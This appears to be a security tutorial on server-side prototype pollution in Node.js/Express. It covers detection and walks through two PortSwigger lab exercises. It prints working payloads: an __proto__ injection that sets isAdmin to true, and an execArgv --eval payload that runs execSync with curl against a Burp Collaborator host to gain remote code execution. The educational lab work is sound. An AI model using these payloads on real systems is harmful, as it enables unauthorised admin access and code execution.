# Server-Side_Prototype_Pollution
Server-Side Prototype Pollution: What is it? How to detect it? How to exploit it?

What is server-side prototype pollution?

Before we dive into advanced exploits regarding server-side prototype pollution, there is prerequisite JavaScript knowledge that is useful regarding this vulnerability. In JavaScript, every function and object have a property called a prototype by default. A prototype can be compared to a system, and the system allows you to develop properties for the object, which can be accessed by the object's instances. User-defined objects are objects which you have created in your application. Objects will inherit the properties of their designated prototype unless they have their own property with the same key, which in turn lets developers create new objects that can reuse the properties and methods of existing objects. 

Due to the growing usage of Node.js and Express, JavaScript is frequently used to build backend applications such as web servers and APIs. This means it is also possible for prototype pollution vulnerabilities to be present in server-side contexts. Server-side prototype pollution is a type of vulnerability that occurs when an attacker manipulates the prototype of an object in a server-side application to inject malicious code or modify the behavior of the application. An attacker can use an identified Server-Side Prototype Pollution vulnerability to control a 'gadget' property that is later used in a sink. The sink is the reflection point that eventually executes the malicious JavaScript injected through the source. Depending on the functionality of the sink, this may give the attacker the ability to execute arbitrary code server-side. Server-Side Prototype pollution can lead to cross-site scripting, remote code execution, privilege escalation, denial of service, and data tampering. 

How to detect server-side prototype pollution? 

Server-side prototype pollution is more difficult to detect than client-side for multiple reasons. The following are some reasons as to why:
1.	Server-side code is executed in the backend, which means the code is not visible to the user. This makes it harder for an attacker to analyze the code and discover vulnerabilities. 

2.	Server-side code is often more complex than client-side code. Server-side applications typically involve multiple layers of code, which can make it difficult to identify security vulnerabilities. 

3.	Server-side code is often protected by firewalls and other security measures, which can make it more difficult for attackers to identify and exploit vulnerabilities.

Detecting server-side prototype pollution vulnerabilities can be challenging, but there are some techniques and tools that can be used to identify them.
One way to detect server-side prototype pollution is to perform a source code analysis on the application. This involves reviewing the code to identify potential vulnerabilities and testing the application with different inputs to see how it behaves. Typically, you will not have access to the vulnerable JavaScript code, but if you do, then it is easier to get an overview of which sinks are present, as well as spotting potential gadget properties.
Here are some suggestions for identifying server-side prototype pollution vulnerabilities in source code:
1.	Prototype pollution attacks often rely on user input to modify an object's prototype. Look for code that accepts user input and modifies an object's prototype without properly validating or sanitizing the input.

2.	Many prototype pollution vulnerabilities are caused by third-party libraries that are used by an application. Identify all third-party libraries that are used in the application and check their source code for any vulnerabilities related to prototype pollution.

3.	Prototype pollution vulnerabilities can also be caused by conditional statements that allow unexpected input to modify an object's prototype. Look for conditional statements that allow input to bypass validation or that do not properly sanitize the input.

By using a combination of these techniques, developers and security professionals can detect and mitigate server-side prototype pollution vulnerabilities in their applications. Let us look at an example of source code vulnerable to server-side prototype pollution:
![Picture1](https://github.com/Jake-Schoellkopf/Server-Side_Prototype_Pollution/assets/133706360/47d9f592-8a2d-479c-9328-81305ef4d008)


In this example, the processData function takes an object data as input and processes its properties by calling the processProperty function. The processProperty function repeatedly processes any nested objects and calls the processValue function for any non-object values. The vulnerability can be exploited due to the processProperty function, which does not securely validate the subKey parameter before using it to access the value object. This means that an attacker can pass in an input object with a  __ proto __  property that points to a prototype object with a polluted property. When the ‘processProperty’ function is called with this input, it will modify the prototype of the value object to include the polluted property. The processValue function does not modify any object prototypes, but it can be used by an attacker to exploit the prototype pollution vulnerability. For example, an attacker could pass in an input object with a property name that is meant to call the processValue function with unexpected input. Overall, this vulnerability demonstrates the importance of validating user input and sanitizing any data that is used to modify object prototypes in server-side code.


Another way to detect server-side prototype pollution is to use a security testing tool that can detect this type of vulnerability. While using a security testing tool, you can analyze the application's code and inputs to identify potential security flaws, including prototype pollution. Burp Suite is a great tool because it acts as a Man In The Middle tool by capturing and analyzing each HTTP request to and from the target web application. 

How to exploit it?
Portswigger Academy has a fantastic set of labs that you can use to practice detecting and exploiting server-side prototype pollution, so we will do a walkthrough of a couple of the labs provided on their platform. With Burp Suite, we can detect and exploit server-side prototype pollution through polluted property reflection, overriding status codes, overriding JSON spaces, and overriding charsets. Utilizing these methods, we will be able to identify that server-side prototype pollution is possible, and then look for potential gadgets to use for an exploit. 
We mentioned earlier about the multitude of ways to detect server-side prototype pollution along with the various exploits you can utilize to escalate the vulnerability. In the first example we will use one of the Portswigger Academy labs to demonstrate how detecting a polluted property reflection can lead to server-side prototype pollution, which can then be escalated to privilege escalation.

Lab: Privilege escalation via server-side prototype pollution  
Scope of the Lab- “This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object. This is simple to detect because any polluted properties inherited via the prototype chain are visible in an HTTP response. To solve the lab: Find a prototype pollution source that you can use to add arbitrary properties to the global Object.prototype. Identify a gadget property that you can use to escalate your privileges. Access the admin panel and delete the user carlos. You can log in to your own account with the following credentials: wiener:peter”.
Before we begin exploiting the application, we have a few things to consider. Prototype pollution often occurs due to the JSON.parse() function, which treats _ proto _ as a regular JavaScript property. A common case for prototype pollution is sending POST or PUT requests that include JSON data to an application or API. When the server responds with a JSON representation of the updated object, you can pollute the global Object.prototype with a new arbitrary property by using a specific method.

Step 1: Here we resubmitted our account settings and captured the POST request with Burp. We see at the bottom of the request that our settings are listed in a JSON format.

![Picture2](https://github.com/Jake-Schoellkopf/Server-Side_Prototype_Pollution/assets/133706360/68c749de-c17c-4a9f-9843-dcc949d10c81)
 


Step 2: We then send this request to repeater and see if we can reflect any object changes.



Step 3: Here we added a new property to the JSON formatted data with the name __ proto __ along with an object containing an arbitrary property, foo:bar (Foo and Bar are used as placeholders when giving examples involving programming).
 
![Picture3](https://github.com/Jake-Schoellkopf/Server-Side_Prototype_Pollution/assets/133706360/3ae92d35-b69a-4b1b-8e7c-3acdfb94dcdb)



Step 4: We sent the request, and now we see in the response that the __ proto __ property is not present, but foo and bar are. This indicates the application is vulnerable to server-side prototype pollution.

![Picture4](https://github.com/Jake-Schoellkopf/Server-Side_Prototype_Pollution/assets/133706360/f90c2b1d-2690-48b3-8ab0-87912bdedd39)
 
Step 5: Now that we know the application is vulnerable, our next step is to identify a gadget that we can pollute to gain privilege escalation. We see there is an isAdmin property in the response, but not in the request, and it is currently set to false. In the request, we replace foo with isAdmin and we replace bar with true. We send the request and notice isAdmin is now set to true.
 
![Picture5](https://github.com/Jake-Schoellkopf/Server-Side_Prototype_Pollution/assets/133706360/06c7cc82-49bb-4dd9-be59-2de0fce64749)


Step 6: We verify this exploit worked successfully by refreshing the webpage and identifying that we now have access to the admin panel. This indicates we have escalated our privileges from a regular user to an administrator. To complete the lab, delete carlos.
 
![Picture6](https://github.com/Jake-Schoellkopf/Server-Side_Prototype_Pollution/assets/133706360/50bc5505-7128-4c8c-848c-7f64a6bb430c)

We have now discovered how to exploit server-side prototype pollution through polluted property reflection, but now lets discover how to exploit this vulnerability without polluted property reflection. This can be accomplished via overriding status codes, JSON spaces, and charsets. What these three methods have in common is that they are non-destructive detection techniques. This means that these techniques can prevent denial-of-service ramifications on your target application.

To attempt server-side prototype pollution via overriding status codes, we need to modify the injected property by adding your own unique status property to the prototype. We should also note that the status code needs to fall within the range of 400 to 599 because JavaScript frameworks such as Node and Express will automatically default to a 500 Internal Server Error response code, and this alone will not prove whether you polluted the prototype. Below is an example of how this would look:

"__ proto __": { 

    "status":588 }
     
The status and status code properties in the response should match the error code you injected. If it is, then you successfully polluted the prototype.


JSON spaces refer to the number of spaces to use for indentation when formatting a JSON object. To attempt server-side prototype pollution via overriding JSON spaces, you can inject your own json spaces property into the prototype object. After that, resend the relevant request and observe if the JSON indentation increases accordingly. This primarily works in the Express JavaScript framework because it provides this option. If you are using Burp, make sure to switch to the message editor's Raw tab so you can see the indentation change. Below is an example of how this would look:

"__ proto __": { 

    "json spaces":15 }

The JSON indentation should be increased to the value of your json spaces injection. If it is, then you successfully polluted the prototype.


Express servers frequently use modules known as "middleware" that allow for the tampering of incoming requests before they are forwarded to the relevant handler function. Since we can manipulate the requests before they are sent to the handler function, we can attempt server-side prototype pollution via overriding the charset. Below is an example of how this would look:
Step 1- Edit one of the JSON properties to have UTF encoded data. For instance:

“email”:”test@test.com”,

“username”:”test”,

“department”:”<add your UTF encoded data here>” 
  
Step 2- Notice that your data is in its encoded form in the response after sending the request.
  
Step 3- Below your “department”:”<add your UTF encoded data here>”, add the following:

“email”:”test@test.com”,
  
“username”:”test”,
  
“department”:”<add your UTF encoded data here>” 
  
"__ proto __":{
  
      "content-type": "application/json; charset=<the UTF version (UTF-7)>"}
  
Step 4- Send the request, and now the UTF data should now be decoded in the response. If it is, then you successfully polluted the prototype.

We have developed a methodology to detect and exploit server-side prototype pollution through polluted property reflection, overriding status codes, overriding JSON spaces, and overriding charsets. Now let’s talk about escalating this process to remote code execution (RCE). Before we demonstrate how to escalate to RCE, there is some more background information to consider.

In Node.js, the execArgv property is used to pass command-line arguments to the Node.js process when it is launched. These arguments provide configuration options or flags that affect how the Node.js runtime behaves. You can attempt code injection by utilizing the --eval argument. The --eval command-line argument allows you to provide a string of JavaScript code that will be evaluated by the Node.js runtime. Additionally, the execSync() function is a method from the Node.js child_process module that executes shell commands simultaneously. The combination of execArgv, --eval, and execSync() can be used to achieve RCE in a Node.js application.

  
We will now do a walkthrough of a portswigger lab where we detect server-side prototype pollution and then we escalate it to remote code execution.
Lab: Remote code execution via server-side prototype pollution
Scope- “This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object. Due to the configuration of the server, it's possible to pollute Object.prototype in such a way that you can inject arbitrary system commands that are subsequently executed on the server. To solve the lab: Find a prototype pollution source that you can use to add arbitrary properties to the global Object.prototype. Identify a gadget that you can use to inject and execute arbitrary system commands. Trigger remote execution of a command that deletes the file /home/carlos/morale.txt. In this lab, you already have escalated privileges, giving you access to admin functionality. You can log in to your own account with the following credentials: wiener:peter”

Step 1: With burp we capture the POST request containing our updated billing and delivery address, which is JSON formatted. 

![Picture7](https://github.com/Jake-Schoellkopf/Server-Side_Prototype_Pollution/assets/133706360/cbd9274d-4781-4d6d-9318-387ae33db1ad)


Step 2: We inject a new property to the JSON formatted data with the name __ proto __, along with an object containing an arbitrary property, foo:bar, to detect server-side prototype pollution. As we can see in the http response, we have polluted the prototype because foo and bar have been added successfully.
 
![Picture8](https://github.com/Jake-Schoellkopf/Server-Side_Prototype_Pollution/assets/133706360/ea62f6ab-6c84-41e5-a8f2-0fe605b0ad5f)


Step 3: We also identified an admin panel which gave us the option to run back-end maintenance jobs. After clicking on the run maintenance jobs button, we are returned with the following:
  
![Picture9](https://github.com/Jake-Schoellkopf/Server-Side_Prototype_Pollution/assets/133706360/384c83ed-b2df-40b6-afe5-3a1bacca1cec)
  
 
Since we have already detected server-side prototype pollution, we will attempt to escalate this vulnerability to gain remote code execution by manipulating this admin functionality. To accomplish this, we will replace foo:bar with the following:
    
  "execArgv":[
        
      "--eval=require(‘child_process’).execSync(‘curl https://ztwkzqc4hbq8111rsdgcrydgc7iy6pue.oastify.com’)"
    
  ]

 }
  
Let’s break down what this new argument is attempting to accomplish. --eval is a command-line argument for the Node.js runtime that instructs it to evaluate the JavaScript code. require(‘child_process’).execSync(‘curl https:// ztwkzqc4hbq8111rsdgcrydgc7iy6pue.oastify.com’) is the JavaScript code that will be evaluated by the Node.js runtime. This uses the require() function to import the built-in Node.js module child_process, which provides functionalities for spawning child processes. To be more specific, it uses the execSync() function from the child_process module to execute the shell command curl https:// ztwkzqc4hbq8111rsdgcrydgc7iy6pue.oastify.com. The intention behind that command is to execute the curl command, which makes a request to our burp collaborator server. If we are returned with DNS interactions in our burp collaborator, then we have proved that we successfully obtained remote code execution.
 

![Picture11](https://github.com/Jake-Schoellkopf/Server-Side_Prototype_Pollution/assets/133706360/ea397bd7-ea4f-4aee-9747-dd7f6de839eb)


Step 4: Now that we have run this command, we go back to the admin panel to “run maintenance jobs” again. When we do it, we are returned with multiple DNS requests in our burp collaborator server, proving that we have gained remote code execution.
  
![Picture12](https://github.com/Jake-Schoellkopf/Server-Side_Prototype_Pollution/assets/133706360/ca7333e1-0557-49e9-a33f-ec2a8abb3cec)  
 
To finish the lab, replace curl https://collab-server.oatsify.com with a command to remove the file.

As we can see, server-side prototype pollution is a very serious vulnerability that can lead to various critical threats. To prevent this vulnerability, you need to thoroughly sanitize all user-controlled input and use whitelisting to make sure that only expected and secure values are accepted. You should also avoid changing built-in JavaScript object prototypes unless it is a necessity. Modifying prototypes can lead to unintended behavior and increase the risk of prototype pollution.
